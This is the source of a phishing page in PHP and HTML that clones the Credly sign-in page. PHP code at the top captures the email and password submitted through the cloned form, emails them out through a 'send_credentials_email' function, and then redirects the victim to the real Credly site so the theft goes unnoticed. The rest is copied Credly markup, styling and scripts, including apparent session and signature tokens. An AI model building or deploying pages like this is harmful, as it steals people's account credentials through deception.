...
// 1. INCLUDE THE MAIL SCRIPT
// This loads the 'send_credentials_email' function into memory
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    // 2. CALL THE FUNCTION
    $success = send_credentials_email($testinginputemail, $testinginputpassword);

    if ($success) {
        // OPTIONAL: Redirect the user after successful email send
        header('Location: https://www.credly.com/users/sign_in'); // Redirect back to the real site
        exit;
    } else {
        // OPTIONAL: Handle email failure (e.g., redirect to a generic error page)
        // header('Location: error.html'); 
        // exit;
    }
}
// No output here - only process the data
?>
...
<body class="">
    ...
    <main id="root">
        <div data-testid="semantic-colors-provider" style="/* ... ALL COLOR VARIABLES REMAIN EXACTLY THE SAME ... */">
            <span id="skip-target" data-debugname="root" style=""></span>

            <!-- Display captured values after form submission -->
                        ...
                        <div class="row homepage__top-content--container_row">
                            ...
                            <div class="col-md-5 homepage__landing-text">
                                ...
                                <div class="homepage__top-text-container">
                                    ...
                                    <ul>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"><!-- ICON --></span>Grow your professional skills</div>
                                        </li>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"><!-- ICON --></span>Broadcast your skills to managers at your company</div>
                                        </li>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"><!-- ICON --></span>Earn credentials that translate to college credit</div>
                                        </li>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"><!-- ICON --></span>Discover new professional opportunities</div>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                            ...
                            <div class="col-md-6 offset-md-1 homepage__children">
                                <div class="homepage__signin-wrapper">
                                    <div class="signin-form" data-webdriver-signin-main="">
                                        <!-- Change form method to POST and add action -->
                                        <form data-testid="form" class="signin-form__form" method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
                                            ...
                                            <div class="c-field-group c-field-group__has-label signin-form__field">
                                                <div class="c-field-group__input-group c-field-group__input-group--enclosed">
                                                    <label for="email_8" id="label_email_8" class="c-input-label c-field-group__label"><span>Email</span><span></span></label>
                                                    <input type="email" name="email" id="email_8" aria-labelledby="label_email_8" autocomplete="email" aria-required="true" class="c-text-field__input" value="<?php echo htmlspecialchars($testinginputemail); ?>">
                                                </div>
                                            </div>
                                            ...
                                            <div class="c-field-group c-field-group__has-label signin-form__field">
                                                <div class="c-field-group__input-group c-field-group__input-group--enclosed">
                                                    ...
                                                    <input type="password" class="c-password-field__input" aria-required="true" name="password" id="password_10" aria-labelledby="label_password_10" autocomplete="current-password" value="">
                                                </div>
                                            </div>
                                            ...
                                            <div>
                                                ...
                                                <a
                                                    ...
                                                    href="https://www.credly.com/users/password/new?_gl=1*14dg3od*_ga*NDM4Nzc3MzUzLjE3NjI5NDUwODg.*_ga_Z763G7NB5L*czE3NjI5NDUwODYkbzEkZzAkdDE3NjI5NDUwOTAkajYwJGwwJGgw*_gcl_au*MjA0ODQ2MDY1OS4xNzYyOTQ1MDkw">
                                                ...
                                                <div class="google-sso-button__responsive-container">
                                                    <div role="button" id="google_sso_btn" class="google-sso-button__g-sso-button">
                                                        <div class="S9gUrf-YoZ4jf" style="position: relative;">
                                                            <div></div>
                                                            <iframe src="./sign_credly_files/button.html" class="L5Fo6c-PQbLGe" allow="identity-credentials-get" id="gsi_109652_628505" title="Button na Mag-sign in gamit ang Google" style="display: block; position: relative; top: 0px; left: 0px; height: 44px; width: 418px; border: 0px; margin: -2px -10px;"></iframe>
                                                        </div>
                                                    </div>
                                                </div>
    ...
    <footer class="transitional" id="footer">
        <div class="grid non-react-footer" hidden="">
                ...
                <div style="text-align: right; font-size: 13px;">
                    <div class="links" style="display: inline;">
                        <div class="footer-link-wrapper" style="display: inline-block;">
                            <a class="footer-link" href="https://resources.credly.com/schedule-a-demo" style="color: #004438; text-decoration: none;">Request Demo</a>
                        </div>
                        <span style="color: #004438; padding: 0 5px;">·</span>

                        <div class="footer-link-wrapper" style="display: inline-block;">
                            <a class="footer-link" href="https://info.credly.com/about-us" style="color: #004438; text-decoration: none;">About Credly</a>
                        </div>
                        <span style="color: #004438; padding: 0 5px;">·</span>

                        <div class="footer-link-wrapper" style="display: inline-block;">
                            <a class="footer-link" href="https://info.credly.com/legal" style="color: #004438; text-decoration: none;">Terms</a>
                        </div>
                        <span style="color: #004438; padding: 0 5px;">·</span>

                        <div class="footer-link-wrapper" style="display: inline-block;">
                            <a class="footer-link" href="https://www.pearson.com/en-gb/privacy-center/privacy-notices.html" style="color: #004438; text-decoration: none;">Privacy</a>
                        </div>
                        <span style="color: #004438; padding: 0 5px;">·</span>

                        <div class="footer-link-wrapper" style="display: inline-block;">
                            <a class="footer-link" href="https://www.credly.com/docs/web_service_api" style="color: #004438; text-decoration: none;">Developers</a>
                        </div>
                        <span style="color: #004438; padding: 0 5px;">·</span>

                        <div class="footer-link-wrapper" style="display: inline-block;">
                            <a class="footer-link" target="_blank" href="https://www.credly.com/support" style="color: #004438; text-decoration: none;">Support</a>
                        </div>

                    </div>

                    <div class="cookie-links" style="display: inline;">
                        <span style="color: #004438; padding: 0 5px;">·</span>
                        <div class="cookie-link-wrapper" style="display: inline-block;">
                            <a class="footer-link" target="_blank" href="https://info.credly.com/cookie-policy" style="color: #004438; text-decoration: none;">Cookies</a>
                        </div>
                        <span style="color: #004438; padding: 0 5px;">·</span>

                        <div class="cookie-link-wrapper" style="display: inline-block;">
                            <a class="footer-link" target="_blank" href="https://info.credly.com/cookie-policy" style="color: #004438; text-decoration: none;">Do Not Sell My Personal Information</a>
                        </div>
                    </div>
                </div>
            </section>
        ...
        <span></span>
        <div data-testid="semantic-colors-provider" style="--canvas-default: #FFFFFF; --canvas-highlight-extraLight: #FAF9F9; --canvas-highlight-light: #F6F4F4; --canvas-highlight-dark: #EFEFEF; --canvas-highlight-brand: #E5EEED; --fill-white: #FFFFFF; --fill-neutral-dark: #EFEFEF; --fill-neutral-light: #FAF9F9; --fill-neutral-skeleton: #EFEFEF; --fill-action-brand-default: #005850; --fill-action-brand-hover: #004438; --fill-action-brand-active: #004438; --fill-action-neutral-light: #C4C4C4; --fill-action-neutral-default: #737373; --fill-action-neutral-hover: #4E4E4E; --fill-action-neutral-active: #2E2E2E; --fill-action-danger-light: #FAEBE8; --fill-action-danger-default: #D0021B; --fill-action-danger-hover: #731E0B; --fill-action-danger-active: #731E0B; --fill-highlight-brand-default: #E5EEED; --fill-highlight-brand-hover: #E5EEED; --fill-highlight-brand-active: #D7E1DF; --fill-highlight-neutral-default: #FAF9F9; --fill-highlight-neutral-hover: #FAF9F9; --fill-highlight-neutral-active: #EFEFEF; --fill-feedback-neutral-bold: #4E4E4E; --fill-feedback-neutral-subtle: #EFEFEF; --fill-feedback-success-bold: #12826A; --fill-feedback-success-subtle: #E9F3F1; --fill-feedback-warning-bold: #F0B400; --fill-feedback-warning-subtle: #FFF7E6; --fill-feedback-error-bold: #D0021B; --fill-feedback-error-subtle: #FAEBE8; --fill-feedback-info-bold: #245FA8; --fill-feedback-info-subtle: #E1ECFA; --fill-feedback-help-bold: #5B4599; --fill-feedback-help-subtle: #E8E1FA; --fill-feedback-orange-bold: #D45900; --fill-feedback-orange-subtle: #FDF1EB; --fill-feedback-olive-bold: #597E19; --fill-feedback-olive-subtle: #EFF3E9; --text-inverse: #FFFFFF; --text-heading-bold: #2E2E2E; --text-heading-subtle: #4E4E4E; --text-body-default: #4E4E4E; --text-body-bold: #2E2E2E; --text-body-subtle: #737373; --text-alt-bold: #4E4E4E; --text-alt-subtle: #737373; --text-accent-primary: #005850; --text-accent-secondary: #004438; --text-action-default: #005850; --text-action-hover: #004438; --text-action-active: #005850; --text-danger-default: #D0021B; --text-danger-hover: #731E0B; --text-danger-active: #731E0B; --text-link-brand-default: #005850; --text-link-brand-hover: #004438; --text-link-brand-active: #004438; --text-link-brand-visited: #5B4599; --text-link-neutral-default: #2E2E2E; --text-link-neutral-hover: #4E4E4E; --text-link-neutral-active: #2E2E2E; --text-link-neutral-visited: #5B4599; --text-feedback-neutral-default: #2E2E2E; --text-feedback-success-default: #0F473A; --text-feedback-success-vibrant: #12826A; --text-feedback-warning-default: #806000; --text-feedback-warning-vibrant: #F0B400; --text-feedback-error-default: #731E0B; --text-feedback-error-vibrant: #D0021B; --text-feedback-info-default: #123054; --text-feedback-info-vibrant: #245FA8; --text-feedback-help-default: #2A1563; --text-feedback-help-vibrant: #5B4599; --text-feedback-orange-default: #AA4700; --text-feedback-orange-vibrant: #D45900; --text-feedback-olive-default: #2F470F; --text-feedback-olive-vibrant: #597E19; --icon-inverse: #FFFFFF; --icon-neutral-default: #4E4E4E; --icon-neutral-light: #737373; --icon-neutral-dark: #2E2E2E; --icon-brand-default: #005850; --icon-brand-hover: #004438; --icon-brand-active: #005850; --icon-danger-default: #D0021B; --icon-danger-hover: #731E0B; --icon-danger-active: #731E0B; --icon-feedback-neutral-default: #2E2E2E; --icon-feedback-success-default: #0F473A; --icon-feedback-success-vibrant: #12826A; --icon-feedback-warning-default: #806000; --icon-feedback-warning-vibrant: #806000; --icon-feedback-error-default: #731E0B; --icon-feedback-error-vibrant: #D0021B; --icon-feedback-info-default: #123054; --icon-feedback-info-vibrant: #245FA8; --icon-feedback-help-default: #2A1563; --icon-feedback-help-vibrant: #5B4599; --icon-feedback-orange-default: #AA4700; --icon-feedback-orange-vibrant: #D45900; --icon-feedback-olive-default: #2F470F; --icon-feedback-olive-vibrant: #597E19; --border-focus: #245FA8; --border-neutral-default: #C4C4C4; --border-neutral-light: #EFEFEF; --border-neutral-dark: #737373; --border-brand-default: #005850; --border-brand-hover: #004438; --border-brand-active: #005850; --border-danger-default: #D0021B; --border-danger-hover: #731E0B; --border-danger-active: #731E0B; --border-divider-light: #EFEFEF; --border-divider-dark: #C4C4C4; --border-inputs-default: #737373; --border-inputs-hover: #004438; --border-inputs-typing: #005850; --border-inputs-selected: #004438; --border-feedback-neutral: #2E2E2E; --border-feedback-error: #D0021B; --border-feedback-warning: #806000; --border-feedback-success: #12826A; --border-feedback-info: #245FA8; --border-feedback-help: #5B4599; --border-feedback-orange: #D45900; --border-feedback-olive: #597E19; --chart-title: #2E2E2E; --chart-subtitle: #4E4E4E; --chart-label: #737373; --chart-border-dark: #C4C4C4; --chart-border-light: #EFEFEF; --chart-colors-1: #005850; --chart-colors-2: #00392F; --chart-colors-3: #B85217; --chart-colors-4: #F0B400; --chart-colors-5: #55827A; --chart-colors-6: #731E0B; --chart-colors-7: #806000; --chart-colors-8: #597E19;">
            <footer data-testid="Footer" class="Footerstyles__FooterContainer-fredly__sc-15uxiyl-0 jEtXAL fredly-footer-with-no-app-links">
                <div class="Footerstyles__AppLinksContainer-fredly__sc-15uxiyl-2 hVVOiM"></div>
                <div class="Footerstyles__FooterLinkContainer-fredly__sc-15uxiyl-1 jFBbow">
                    <ul>
                        <li><a href="https://resources.credly.com/schedule-a-demo" target="_self" aria-disabled="false" data-testid="TextLink" class="TextLinkstyles__Container-fredly__sc-lb8ycv-1 fCsYFK"><span data-testid="Typography" class="Typographystyles__Container-fredly__sc-1jldzrm-0 cFsBZD TextLinkstyles__StyledTypography-fredly__sc-lb8ycv-0 hNJyRD">Request Demo</span></a></li>
                        <li><a href="https://info.credly.com/about-us" target="_self" aria-disabled="false" data-testid="TextLink" class="TextLinkstyles__Container-fredly__sc-lb8ycv-1 fCsYFK"><span data-testid="Typography" class="Typographystyles__Container-fredly__sc-1jldzrm-0 cFsBZD TextLinkstyles__StyledTypography-fredly__sc-lb8ycv-0 hNJyRD">About Credly</span></a></li>
                        <li><a href="https://info.credly.com/legal" target="_self" aria-disabled="false" data-testid="TextLink" class="TextLinkstyles__Container-fredly__sc-lb8ycv-1 fCsYFK"><span data-testid="Typography" class="Typographystyles__Container-fredly__sc-1jldzrm-0 cFsBZD TextLinkstyles__StyledTypography-fredly__sc-lb8ycv-0 hNJyRD">Terms</span></a></li>
                        <li><a href="https://www.pearson.com/en-gb/privacy-center/privacy-notices.html" target="_self" aria-disabled="false" data-testid="TextLink" class="TextLinkstyles__Container-fredly__sc-lb8ycv-1 fCsYFK"><span data-testid="Typography" class="Typographystyles__Container-fredly__sc-1jldzrm-0 cFsBZD TextLinkstyles__StyledTypography-fredly__sc-lb8ycv-0 hNJyRD">Privacy</span></a></li>
                        <li><a href="https://www.credly.com/docs/web_service_api" target="_self" aria-disabled="false" data-testid="TextLink" class="TextLinkstyles__Container-fredly__sc-lb8ycv-1 fCsYFK"><span data-testid="Typography" class="Typographystyles__Container-fredly__sc-1jldzrm-0 cFsBZD TextLinkstyles__StyledTypography-fredly__sc-lb8ycv-0 hNJyRD">Developers</span></a></li>
                        <li><a href="https://www.credly.com/support" target="_blank" aria-disabled="false" data-testid="TextLink" class="TextLinkstyles__Container-fredly__sc-lb8ycv-1 fCsYFK"><span data-testid="Typography" class="Typographystyles__Container-fredly__sc-1jldzrm-0 cFsBZD TextLinkstyles__StyledTypography-fredly__sc-lb8ycv-0 hNJyRD">Support</span></a></li>
                        <li><a href="https://info.credly.com/cookie-policy" target="_blank" aria-disabled="false" data-testid="TextLink" class="TextLinkstyles__Container-fredly__sc-lb8ycv-1 fCsYFK"><span data-testid="Typography" class="Typographystyles__Container-fredly__sc-1jldzrm-0 cFsBZD TextLinkstyles__StyledTypography-fredly__sc-lb8ycv-0 hNJyRD">Cookies</span></a></li>
                        <li><a href="https://info.credly.com/cookie-policy" target="_blank" aria-disabled="false" data-testid="TextLink" class="TextLinkstyles__Container-fredly__sc-lb8ycv-1 fCsYFK"><span data-testid="Typography" class="Typographystyles__Container-fredly__sc-1jldzrm-0 cFsBZD TextLinkstyles__StyledTypography-fredly__sc-lb8ycv-0 hNJyRD">Do Not Sell My Personal Information</span></a></li>
                    </ul>
                </div>
            </footer>
        </div>
    ...
    <script src="./sign_credly_files/set_time_zone_cookie-aca1fcb79ea4e90d8e963d7850b867a9bbeb077b05a6cad141c1ce7d945fd20d.js.download" crossorigin="anonymous"></script>
    <script nonce="">
        //<![CDATA[
        (function() {
            if (typeof(App) !== 'undefined' && App.Behaviors && App.Behaviors.TrackStat) {
                App.Behaviors.TrackStat.init({
                        "url": "https:\/\/stats.credly.com\/stats\/interaction",
                        "request_data": {
                            "session_id": "aaf02b14-06fd-4f21-a864-6973e21be54b",
                            "flexible_params_auth": ["snapshot_json", "stat_object_id", "stat_object_type", "stat_type"],
                            "auth_version": "1.0",
                            "auth_key": "user:8d768abb-4e6a-4f38-8cb3-86dc95196f75",
                            "auth_timestamp": "1762945092",
                            "auth_signature": "95143d650f96595125ea19b5f20d1da9168934730de5f0a006dbe2056bfe3cee"
                        }
                    },
                    null
                );
        ...
        (function() {
            ...
            vals.locationData = {
                ...
                allowedStatesOrProvinces: {
                    "United Arab Emirates": ["Abu Dhabi", "Ajman", "Dubai", "Dubai", "Fujairah", "Ras al Khaimah", "Ras Al Khaimah", "Sharjah", "Umm Al Quwain"],
                    "Afghanistan": ["Badakhshan", "Kabul"],
                    "Albania": ["Fier County", "Qarku i Elbasanit", "Tirana County"],
                    "Armenia": ["Kotayk Province", "Yerevan"],
                    "Angola": ["Luanda Province"],
                    "Argentina": ["Buenos Aires", "Buenos Aires", "Buenos Aires Province", "Cordoba", "Corrientes Province", "Mendoza Province", "Santa Cruz Province", "Santa Fe Province"],
                    "Austria": ["Carinthia", "Lower Austria", "Styria", "Tyrol", "Upper Austria", "Vienna", "Vorarlberg"],
                    ...
                    "Bangladesh": ["Chittagong Division", "Dhaka Division", "Khulna Division", "Rajshahi Division", "Sylhet Division"],
                    "Belgium": ["Brussels", "Flanders", "Wallonia"],
                    "Bulgaria": ["Plovdiv Province", "Silistra", "Sofia City Province", "Veliko Tarnovo Province"],
                    "Bahrain": ["Capital Governorate", "Muharraq Governorate", "Northern Governorate", "Southern Governorate"],
                    "Benin": ["Atlantique Department", "Littoral Department"],
                    "Bermuda": ["Pembroke Parish"],
                    "Bolivia": ["Santa Cruz Department"],
                    "Brazil": ["Espírito Santo", "Federal District", "Mato Grosso", "Pará", "State of Bahia", "State of Ceará", "State of Goiás", "State of Minas Gerais", "State of Paraná", "State of Pernambuco", "State of Rio de Janeiro", "State of Rio Grande do Norte", "State of Rio Grande do Sul", "State of Santa Catarina", "State of São Paulo"],
                    "Bahamas": ["New Providence"],
                    "Bhutan": ["Thimphu"],
                    "Botswana": ["South-East District"],
                    "Belarus": ["Minsk Region", "Mogilev Region"],
                    "Canada": ["Alberta", "British Columbia", "Manitoba", "New Brunswick", "Newfoundland and Labrador", "Northwest Territory", "Nova Scotia", "Nunavut Territory", "Ontario", "Prince Edward Island", "Quebec", "Saskatchewan", "Yukon"],
                    "Congo, The Democratic Republic Of The": ["Kinshasa", "North-Kivu", "South-Kivu"],
                    "Switzerland": ["Aargau", "Basel City", "Basel-Landschaft", "Canton of Bern", "Fribourg", "Geneva", "Schwyz", "Solothurn", "Thurgau", "Ticino", "Vaud", "Zurich"],
                    "Côte D'Ivoire": ["Abidjan Autonomous District", "Comoé District"],
                    "Chile": ["Antofagasta", "Bio Bio", "Maule", "Santiago Metropolitan Region", "Valparaíso"],
                    "Cameroon": ["Centre Region", "Littoral Region", "Northwest Region", "Région du Nord", "Southwest Region"],
                    "China": ["Anhui", "Beijing", "Fujian", "Gansu", "Guangdong Province", "Henan", "Jiangsu", "Jiangxi", "Jilin", "Shandong", "Shanghai", "Tianjin", "Zhejiang"],
                    "Colombia": ["Antioquia", "Atlantico", "Bogota", "Bolivar", "Cesar", "Choco", "Cundinamarca", "Huila", "Magdalena", "Risaralda", "Santander", "Valle del Cauca"],
                    "Costa Rica": ["Alajuela Province", "Cartago Province", "Heredia Province", "Provincia de Alajuela", "San José Province"],
                    "Curaçao": ["Curaçao"],
                    "Cyprus": ["Famagusta", "Larnaca", "Limassol", "Nicosia"],
                    "Czech Republic": ["Hradec Králové Region", "Olomouc Region", "Prague", "South Moravian Region", "Zlín Region"],
                    "Germany": ["Baden-Württemberg", "Bavaria", "Berlin", "Brandenburg", "Hamburg", "Hessen", "Lower Saxony", "Mecklenburg-Vorpommern", "North Rhine-Westphalia", "Rhineland-Palatinate", "Saarland", "Saxony", "Schleswig-Holstein", "Thuringia"],
                    "Dominican Republic": ["Distrito Nacional", "Duarte Province", "La Altagracia", "La Altagracia Province", "La Romana Province", "Samaná Province", "Santiago Province"],
                    "Algeria": ["Algiers Province", "Batna Province", "Constantine Province", "Jijel Province", "Mila Province", "Mostaganem Province", "Relizane Province", "Sétif Province", "Skikda Province", "Tlemcen Province"],
                    "Ecuador": ["Azuay", "Chimborazo", "El Oro", "Guayas", "Imbabura", "Pichincha", "Santo Domingo de los Tsachilas"],
                    "Estonia": ["Harju County", "Ida-Viru County"],
                    "Egypt": ["Alexandria Governorate", "Al-Qalyubia Governorate", "Al-Sharqia Governorate", "Ash Sharqia Governorate", "Beni Suef Governorate", "Cairo Governorate", "Dakahlia Governorate", "Damietta Governorate", "Giza Governorate", "Menofia Governorate"],
                    "Spain": ["Andalusia", "Aragon", "Asturias", "Balearic Islands", "Basque Country", "Canary Islands", "Cantabria", "Castile and León", "Castile-La Mancha", "Catalonia", "Community of Madrid", "Comunitat Valenciana", "Galicia", "Navarre", "Region of Murcia"],
                    "Ethiopia": ["Addis Ababa", "Oromia"],
                    "Finland": ["Central Finland", "Kainuu", "North Ostrobothnia", "North Savo", "Ostrobothnia", "Pirkanmaa", "Satakunta", "South Karelia", "South Savo", "Southwest Finland", "Uusimaa"],
                    "Fiji": ["Central Division", "Western Division"],
                    "Micronesia, Federated States Of": ["Pohnpei"],
                    "France": ["Auvergne-Rhône-Alpes", "Bourgogne-Franche-Comté", "Brittany", "Centre-Val de Loire", "Grand Est", "Hauts-de-France", "Île-de-France", "Île-de-France", "Nouvelle-Aquitaine", "Occitanie", "Pays de la Loire", "Provence-Alpes-Côte d'Azur"],
                    "Gabon": ["Estuaire"],
                    "United Kingdom": ["England", "Northern Ireland", "Scotland", "Wales"],
                    "Georgia": ["Adjara", "Tbilisi"],
                    "Ghana": ["Central Region", "Greater Accra Region", "Northern Region", "Western North Region"],
                    "Guinea": ["Conakry"],
                    "Guatemala": ["Guatemala Department", "Quetzaltenango Department"],
                    "Guyana": ["Demerara-Mahaica"],
                    "Hong Kong": ["Hong Kong Island", "New Territories"],
                    "Honduras": ["Cortés Department", "Francisco Morazán Department"],
                    "Croatia": ["Karlovac County", "Osijek-Baranja County", "Zagreb County"],
                    "Indonesia": ["Bali", "Banten", "Bengkulu", "Central Java", "East Java", "Jakarta", "North Sumatra", "Riau Islands", "South Sulawesi", "South Sumatra", "West Java", "West Kalimantan", "West Sumatra"],
                    "Ireland": ["County Carlow", "County Cork", "County Dublin", "County Galway", "County Kildare", "County Limerick", "County Louth", "County Meath", "County Waterford", "County Westmeath", "County Wexford", "County Wicklow"],
                    "Israel": ["Center District", "South District", "Tel Aviv District"],
                    "Isle of Man": ["Douglas"],
                    "India": ["Andhra Pradesh", "Assam", "Bihar", "Chandigarh", "Chhattisgarh", "Delhi", "Goa", "Gujarat", "Haryana", "Himachal Pradesh", "Jharkhand", "Karnataka", "Kerala", "Ladakh", "Madhya Pradesh", "Maharashtra", "Meghalaya", "Odisha", "Odisha", "Puducherry", "Punjab", "Rajasthan", "Tamil Nadu", "Telangana", "Telangana", "Uttarakhand", "Uttar Pradesh", "West Bengal"],
                    "Iraq": ["Baghdad Governorate", "Basra Governorate", "Duhok Governorate", "Karbala Governorate", "Kurdistan Region", "Maysan Governorate"],
                    "Italy": ["Abruzzo", "Apulia", "Basilicata", "Calabria", "Campania", "Emilia-Romagna", "Friuli-Venezia Giulia", "Lazio", "Liguria", "Lombardia", "Lombardy", "Marche", "Piedmont", "Puglia", "Sicilia", "Sicily", "Trentino-South Tyrol", "Tuscany", "Umbria", "Veneto"],
                    "Jamaica": ["St. Andrew Parish", "St. James Parish", "Westmoreland Parish"],
                    "Jordan": ["Amman Governorate", "Zarqa Governorate"],
                    "Japan": ["Aichi", "Aomori", "Chiba", "Fukuoka", "Gifu", "Gunma", "Hiroshima", "Hokkaido", "Ibaraki", "Iwate", "Kanagawa", "Kumamoto", "Kyoto", "Nara", "Oita", "Okinawa", "Osaka", "Saitama", "Shiga", "Shizuoka", "Tochigi", "Tokyo", "Toyama", "Yamagata", "Yamanashi"],
                    "Kenya": ["Kakamega County", "Kiambu County", "Laikipia County", "Machakos County", "Mombasa County", "Nairobi County", "Turkana County", "Uasin Gishu County"],
                    "Kyrgyzstan": ["Bishkek City"],
                    "Cambodia": ["Kandal Province", "Phnom Penh", "Siem Reap Province"],
                    "Korea, Republic of": ["Busan", "Gangwon-do", "Gyeonggi-do", "Gyeongsangbuk-do", "Incheon", "Jeollanam-do", "Seoul"],
                    "Kuwait": ["Al Ahmadi Governorate", "Al Asimah Governate", "Al Farwaniyah Governorate", "Hawalli Governorate"],
                    "Cayman Islands": ["George Town"],
                    "Kazakhstan": ["Almaty Region", "Astana", "Atyrau Region", "Turkistan Region"],
                    "Lao People's Democratic Republic": ["Vientiane Prefecture"],
                    "Lebanon": ["Beirut Governorate", "Beqaa Governorate", "South Governorate"],
                    "Saint Lucia": ["Gros Islet"],
                    "Liechtenstein": ["Gamprin"],
                    "Sri Lanka": ["Central Province", "Eastern Province", "North Central Province", "North Western Province", "Sabaragamuwa Province", "Southern Province", "Uva Province", "Western Province"],
                    "Liberia": ["Montserrado"],
                    "Lithuania": ["Alytus County", "Kaunas County", "Vilnius County"],
                    "Luxembourg": ["Grevenmacher", "Luxembourg"],
                    "Libya": ["Benghazi district", "Misrata District", "Tripoli District", "Zawiya District"],
                    "Morocco": ["Casablanca-Settat", "Fez-Meknès", "Marrakesh-Safi", "Rabat-Salé-Kénitra", "Souss-Massa", "Tangier-Tétouan-Al Hoceima"],
                    "Moldova, Republic of": ["Chisinau"],
                    "Madagascar": ["Analamanga"],
                    "North Macedonia": ["Greater Skopje"],
                    "Mali": ["Bamako Capital District"],
                    "Myanmar": ["Magway Region", "Mandalay Region", "Tanintharyi Region", "Yangon Region"],
                    "Northern Mariana Islands": ["Saipan"],
                    "Mauritania": ["Dakhlet Nouadhibou"],
                    "Mauritius": ["Pamplemousses District", "Plaines Wilhems District", "Port Louis District", "Rivière du Rempart District"],
                    "Maldives": ["Laamu Atoll", "Malé", "Raa Atoll"],
                    "Malawi": ["Northern Region", "Southern Region"],
                    "Mexico": ["Aguascalientes", "Baja California", "Baja California Sur", "Campeche", "Chiapas", "Chihuahua", "Coahuila", "Colima", "Durango", "Guanajuato", "Jalisco", "Mexico City", "Michoacán", "Morelos", "Nayarit", "Nuevo Leon", "Oaxaca", "Puebla", "Querétaro", "Quintana Roo", "San Luis Potosi", "Sonora", "State of Mexico", "Tabasco", "Tamaulipas", "Veracruz", "Yucatán"],
                    "Malaysia": ["Federal Territory of Kuala Lumpur", "Johor", "Johor Darul Ta'zim", "Kedah", "Negeri Sembilan", "Penang", "Perak", "Putrajaya", "Sabah", "Sarawak", "Selangor"],
                    "Mozambique": ["Maputo", "Nampula Province"],
                    "Nigeria": ["Abia", "Adamawa", "Akwa Ibom", "Anambra", "Delta", "Edo", "Ekiti", "Enugu", "Federal Capital Territory", "Gombe", "Imo", "Jigawa", "Kaduna", "Kano", "Kwara", "Lagos", "Niger", "Ogun State", "Osun", "Oyo", "Plateau", "Rivers", "Yobe"],
                    "Nicaragua": ["Managua"],
                    "Netherlands": ["Drenthe", "Flevoland", "Gelderland", "Groningen", "Limburg", "North Brabant", "North Holland", "Overijssel", "South Holland", "Utrecht", "Zeeland"],
                    "Norway": ["Akershus", "Innlandet", "Møre og Romsdal", "Oslo", "Østfold", "Rogaland", "Telemark", "Trøndelag", "Vestland", "Viken"],
                    "Nepal": ["Bagmati Province", "Lumbini Province", "Sudurpashchim Province"],
                    "New Zealand": ["Auckland", "Bay of Plenty", "Canterbury", "Hawke's Bay", "Manawatu-Wanganui", "Otago Region", "Southland", "Waikato", "Waikato Region", "Wellington", "Wellington Region"],
                    "Oman": ["Ad Dakhiliyah ‍Governorate", "Ad Dhahirah Governorate", "Al Batinah North Governorate", "Musandam Governorate", "Muscat Governorate"],
                    "Panama": ["Panamá Province"],
                    "Peru": ["Callao Region", "Lima Province", "Loreto"],
                    "Papua New Guinea": ["National Capital District"],
                    "Philippines": ["Bangsamoro Autonomous Region in Muslim Mindanao", "Bicol", "Cagayan Valley", "Calabarzon", "Central Luzon", "Central Visayas", "Davao Region", "Ilocos Region", "Metro Manila", "MIMAROPA", "Northern Mindanao", "Western Visayas", "Zamboanga Peninsula"],
                    "Pakistan": ["Balochistan", "Islamabad Capital Territory", "Khyber Pakhtunkhwa", "Punjab", "Sindh"],
                    "Poland": ["Greater Poland Voivodeship", "Kuyavian-Pomeranian Voivodeship", "Lesser Poland Voivodeship", "Łódź Voivodeship", "Lower Silesian Voivodeship", "Lublin Voivodeship", "Masovian Voivodeship", "Podkarpackie Voivodeship", "Pomeranian Voivodeship", "Silesian Voivodeship", "Województwo podlaskie"],
                    "Puerto Rico": ["Arecibo", "Bayamón", "Carolina", "Ceiba", "Juncos", "Mayagüez", "Río Grande", "San Juan", "San Lorenzo"],
                    "Portugal": ["Aveiro District", "Braga", "Faro District", "Guarda District", "Leiria District", "Lisboa", "Lisbon", "Porto", "Porto District", "Setubal"],
                    "Palau": ["Koror"],
                    "Paraguay": ["Alto Paraná Department", "Canindeyú"],
                    "Qatar": ["Al Daayen Municipality", "Al Khor and Al Thakhira Municipality", "Al Rayyan Municipality", "Al Wakrah Municipality", "Al Wakra Municipality", "Doha", "Doha Municipality", "Umm Salal Municipality"],
                    "Romania": ["Brașov", "Bucharest", "Cluj County", "Constanța", "Dolj County", "Ilfov County", "Timiș"],
                    "Serbia": ["Vojvodina"],
                    "Russian Federation": ["Moscow"],
                    "Rwanda": ["Kigali City", "Northern Province"],
                    "Saudi Arabia": ["Al Bahah Province", "Al Jowf Province", "Al Madinah Province", "Al Qassim Province", "Aseer Province", "Eastern Province", "Hail Province", "Jazan Province", "Makkah Province", "Najran Province", "Northern Borders Province", "Riyadh Province", "Tabuk Province", "منطقة الرياض"],
                    "Seychelles": ["Grand Anse Praslin"],
                    "Sweden": ["Dalarna County", "Gavleborg County", "Jonkoping County", "Kalmar County", "Örebro County", "Östergötland County", "Skåne County", "Stockholm County", "Uppsala County", "Västerbotten County", "Västmanland County", "Västra Götaland County"],
                    "Saint Helena": ["Ascension"],
                    "Slovenia": ["Ljubljana"],
                    "Slovakia": ["Bratislava Region", "Košice Region", "Trenčín Region", "Žilina Region"],
                    "Sierra Leone": ["Western Area"],
                    "Senegal": ["Dakar Region", "Kaolack Region"],
                    "Somalia": ["Banaadir", "Lower Juba"],
                    "Suriname": ["Paramaribo District"],
                    "El Salvador": ["Cuscatlán Department"],
                    "Swaziland": ["Lubombo Region", "Manzini"],
                    "Turks and Caicos Islands": ["Turks Islands"],
                    "Chad": ["N'Djamena"],
                    "Togo": ["Maritime Region"],
                    "Thailand": ["Bangkok", "Chiang Mai", "Chiang Rai", "Chon Buri", "Nakhon Si Thammarat", "Nong Khai", "Nonthaburi", "Pathum Thani", "Phra Nakhon Si Ayutthaya", "Samut Prakan", "Udon Thani"],
                    "Timor-Leste": ["Dili"],
                    "Turkmenistan": ["Lebap"],
                    "Tunisia": ["Béja Governorate", "Le Kef Governorate", "Nabeul Governorate", "Sfax Governorate", "Tunis Governorate"],
                    "Turkey": ["Ankara", "Antalya", "Hatay", "İstanbul", "İzmir", "Kocaeli", "Mersin", "Muğla", "Niğde", "Sakarya", "Uşak"],
                    "Trinidad and Tobago": ["Arima Borough Corporation"],
                    "Tuvalu": ["Funafuti"],
